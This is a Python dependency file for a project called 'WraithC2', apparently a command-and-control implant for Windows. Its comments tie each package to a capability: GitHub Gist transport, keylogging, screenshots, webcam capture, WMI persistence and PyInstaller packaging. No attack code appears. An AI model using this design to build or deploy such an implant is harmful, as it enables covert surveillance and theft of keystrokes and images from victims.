# WraithC2 - Python dependencies
# Install with:  pip install -r requirements.txt
# Tested on Python 3.11 / Windows

# -- HTTP client (Gist transport + AI API calls) --------------
requests>=2.31.0

# -- Input capture (keylogger + type_text) --------------------
pynput>=1.7.6

# -- Image / screenshots --------------------------------------
Pillow>=10.2.0

# -- Webcam capture -------------------------------------------
opencv-python>=4.9.0

# -- Windows API (pywin32 post-install needed after pip)
# After install run:
#   python Scripts/pywin32_postinstall.py -install
pywin32>=306

# -- Windows audio control ------------------------------------
pycaw>=20240210
comtypes>=1.4.1

# -- WMI (persistence / system info) -------------------------
wmi>=1.5.1

# -- System info (process listing) ----------------------------
psutil>=5.9.8

# -- PyInstaller (for compile.bat - build environment only) ---
pyinstaller>=6.5.0
